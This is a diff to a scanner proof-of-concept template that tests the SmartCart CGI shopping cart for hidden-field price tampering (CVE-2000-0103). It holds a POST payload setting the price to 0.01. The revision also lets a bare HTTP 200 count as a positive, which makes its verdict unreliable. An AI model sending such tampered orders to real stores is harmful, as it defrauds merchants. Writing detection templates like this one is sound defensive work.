@@ -1,8 +1,8 @@
 [info]
 author = "ave"
-description = "验证 SmartCart 购物车应用中订单表单隐藏字段可被篡改。构造 POST 请求修改价格、总价等隐藏字段为极低值，若服务器接受篡改后的订单数据则存在漏洞。"
+description = "检测 SmartCart 购物车应用是否存在隐藏表单域篡改漏洞（CVE-2000-0103）。该应用将商品价格、数量等敏感信息存放在 HTML 隐藏字段中提交，攻击者可拦截请求修改这些字段值，以任意价格完成订单。"
 id = "POC-AVE-2000-0087"
-name = "SmartCart 购物车隐藏表单字段篡改漏洞 PoC"
+name = "SmartCart 购物车隐藏表单域篡改 PoC"
 severity = "high"
 tags = ["ave-2000-0087"]
 vuln_id = [
@@ -11,27 +11,40 @@ vuln_id = [
 ]
 
 [poc]
-logic = "all"
+logic = "any"
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/cgi-bin/smartcart.cgi"
+protocol = "http"
+
+[poc.requests.headers]
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+status = [200]
+type = "status"
 
 [[poc.requests]]
 method = "POST"
-path = "/{{BaseURL}}/cgi-bin/SmartCart/order.cgi"
+path = "/{{BaseURL}}/cgi-bin/smartcart.cgi"
 protocol = "http"
 
 [poc.requests.body]
-content = "item_id=1&quantity=1&price=0.01&total=0.01&submit=order"
+content = "item_id=001&item_name=Test+Product&price=0.01&quantity=1&action=add"
 type = "raw"
 
 [poc.requests.headers]
 Content-Type = "application/x-www-form-urlencoded"
+User-Agent = "AVE/1.0"
 
 [[poc.requests.matchers]]
 expect = true
 part = "body"
 type = "word"
 words = [
-    "thank",
-    "order",
+    "added",
     "success",
-    "complete",
+    "cart",
 ]
